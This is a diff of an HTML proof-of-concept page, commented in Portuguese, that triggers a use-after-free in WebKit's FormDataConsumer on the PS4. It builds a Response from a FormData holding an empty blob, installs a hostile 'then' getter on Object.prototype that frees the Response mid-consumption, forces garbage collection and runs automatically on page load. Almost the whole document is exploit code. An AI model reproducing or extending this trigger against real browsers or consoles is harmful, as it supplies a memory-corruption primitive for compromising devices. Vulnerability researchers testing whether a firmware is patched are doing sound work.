@@ -1,44 +1,97 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>PoC Adaptado - FormDataConsumer empty blob</title>
+    <title>FormDataConsumer empty blob UAF test (PS4 adapted)</title>
+    <style>
+        body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+        #log { white-space: pre-wrap; }
+        .ok { color: #0f0; }
+        .fail { color: #f00; }
+        .info { color: #ff0; }
+    </style>
 </head>
 <body>
-<button id="run">Executar</button>
-<script>
-function allocPressure(iterations) {
-    var sink = [];
-    for (var i = 0; i < iterations; i++) {
-        sink.push(new Array(256).join('x') + i);
-        if (i % 64 === 0) {
-            sink.push(new ArrayBuffer(4096));
+    <h2>FormDataConsumer empty-blob UAF test (PS4)</h2>
+    <div id="log"></div>
+
+    <script>
+        function log(msg, type) {
+            var el = document.getElementById('log');
+            var span = document.createElement('div');
+            span.className = type || 'info';
+            span.textContent = msg;
+            el.appendChild(span);
         }
-    }
-    return sink.length;
-}
 
-function triggerCase() {
-    var emptyBlob = new Blob([]);
-    var fd = new FormData();
-    fd.append('a', emptyBlob);
+        function tryGC() {
+            // Tentativas de forçar GC (o PS4 não tem gc() exposto)
+            if (typeof gc === 'function') {
+                gc();
+                return;
+            }
+            // Fallback fraco
+            for (var i = 0; i < 50; i++) {
+                new ArrayBuffer(1024 * 1024);
+            }
+        }
 
-    var response = new Response(fd);
+        function runTest() {
+            log('Iniciando teste...', 'info');
 
-    Object.prototype.__defineGetter__('then', function() {
-        response = null;
-        allocPressure(4000);
-    });
+            try {
+                // 1. Blob vazio (substitui o blob clonado via IndexedDB)
+                var emptyBlob = new Blob([]);          // tamanho 0
+                // Alternativa se quiser um pouco de conteúdo:
+                // var emptyBlob = new Blob(['']);
 
-    allocPressure(2000);
-    response.arrayBuffer();
-}
+                var formData = new FormData();
+                formData.append('a', emptyBlob);
 
-document.getElementById('run').onclick = function() {
-    for (var round = 0; round < 50; round++) {
-        triggerCase();
-    }
-};
-</script>
+                var response = new Response(formData);
+
+                // 2. Getter malicioso para liberar a Response no meio do consumo
+                Object.prototype.__defineGetter__('then', function() {
+                    log('then getter acionado → liberando response + tentando GC', 'info');
+                    response = null;
+                    tryGC();
+                    // Remove o getter para não poluir o resto da página
+                    try {
+                        delete Object.prototype.then;
+                    } catch (e) {}
+                });
+
+                log('Chamando response.arrayBuffer()...', 'info');
+
+                // 3. Dispara o consumo do FormData
+                var promise = response.arrayBuffer();
+
+                // Se o navegador retornar uma Promise de verdade
+                if (promise && typeof promise.then === 'function') {
+                    promise.then(function(buf) {
+                        log('arrayBuffer resolveu com sucesso (tamanho: ' + (buf ? buf.byteLength : 0) + ')', 'ok');
+                        log('Se não crashou, o UAF provavelmente já foi corrigido neste firmware.', 'ok');
+                    }).catch(function(err) {
+                        log('arrayBuffer rejeitou: ' + err, 'fail');
+                    });
+                } else {
+                    log('arrayBuffer não retornou Promise (comportamento antigo do WebKit)', 'info');
+                }
+
+                // Força mais um pouco de pressão de memória
+                setTimeout(function() {
+                    tryGC();
+                    log('Teste finalizado. Se a página ainda está viva, o crash não ocorreu.', 'ok');
+                }, 500);
+
+            } catch (e) {
+                log('Exceção síncrona: ' + e, 'fail');
+            }
+        }
+
+        // Roda automaticamente
+        window.onload = function() {
+            setTimeout(runTest, 100);
+        };
+    </script>
 </body>
 </html>
